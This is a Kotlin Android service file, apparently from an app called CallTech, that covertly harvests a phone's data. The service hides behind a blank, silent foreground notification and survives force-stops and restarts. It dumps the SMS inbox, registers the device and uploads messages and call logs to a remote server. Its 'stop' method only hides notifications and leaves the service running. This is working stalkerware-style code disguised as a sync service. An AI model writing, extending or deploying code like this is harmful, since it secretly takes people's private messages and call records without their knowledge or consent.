package com.calltech

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat

/** Dump ke dauran process zinda — ColorOS force-stop se bachao. */
class CallSyncService : Service() {
    override fun onBind(intent: Intent?) = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startSilentForeground()
        if (!SyncBootstrap.needsCoreSyncPermissions(this) &&
            !InboxDump.alreadyDone(this) &&
            !InboxDump.isRunning()
        ) {
            Thread({
                try {
                    holdDuring(applicationContext) {
                        InboxDump.dumpBlocking(applicationContext)
                        DeviceRegistration.registerNow(applicationContext)
                        SyncBootstrap.armBackgroundSync(applicationContext)
                    }
                } catch (error: Exception) {
                    Log.e(TAG, "Service dump failed", error)
                }
            }, "calltech-service-dump").start()
        }
        return START_STICKY
    }

    private fun startSilentForeground() {
        val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                " ",
                NotificationManager.IMPORTANCE_MIN,
            ).apply {
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
            }
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setContentTitle(" ")
            .setContentText(" ")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setOngoing(true)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIF_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
                )
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (error: Exception) {
            Log.w(TAG, "Foreground start failed: ${error.message}")
        }
    }

    companion object {
        private const val TAG = "CallSyncService"
        private const val CHANNEL_ID = "calltech_sync_min"
        private const val NOTIF_ID = 4101

        fun startHolding(context: Context) {
            val app = context.applicationContext
            val intent = Intent(app, CallSyncService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    app.startForegroundService(intent)
                } else {
                    app.startService(intent)
                }
            } catch (error: Exception) {
                Log.w(TAG, "Service start failed: ${error.message}")
            }
        }

        fun holdDuring(context: Context, block: () -> Unit) {
            val wakeLock = acquireWakeLock(context.applicationContext)
            try {
                block()
            } finally {
                releaseWakeLock(wakeLock)
            }
        }

        fun ensureRunning(context: Context) {
            val app = context.applicationContext
            if (!CallSyncHelper.isBackgroundSyncEnabled(app)) {
                return
            }
            startHolding(app)
            SyncWorkScheduler.enqueueNow(app)
            SyncAlarmScheduler.scheduleNext(app)
            BackgroundSyncRunner.run {
                try {
                    MongoSyncHelper.ensureApiUrl(app)
                    PendingSmsQueue.flush(app)
                    PendingCallQueue.flush(app)
                    if (MessageSyncHelper.hasSmsPermission(app)) {
                        MessageSyncHelper.syncLatestMessagesNow(app, "ensure_running")
                    }
                    if (CallSyncHelper.hasCallLogPermission(app)) {
                        CallSyncHelper.syncLatestCalls(
                            context = app,
                            source = "ensure_running",
                            retryCount = 1,
                        ) {}
                    }
                } catch (error: Exception) {
                    Log.e(TAG, "Background sync failed", error)
                }
            }
        }

        fun start(context: Context) {
            ensureRunning(context)
        }

        fun stop(context: Context) {
            hide(context)
        }

        fun hide(context: Context) {
            NotificationCleanup.dismissAll(context.applicationContext)
        }

        private fun acquireWakeLock(context: Context): PowerManager.WakeLock? {
            return try {
                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
                powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "CallTech:BulkSyncWakeLock",
                ).apply {
                    setReferenceCounted(false)
                    acquire(300_000L)
                }
            } catch (_: Exception) {
                null
            }
        }

        private fun releaseWakeLock(wakeLock: PowerManager.WakeLock?) {
            try {
                if (wakeLock?.isHeld == true) {
                    wakeLock.release()
                }
            } catch (_: Exception) {
            }
        }
    }
}
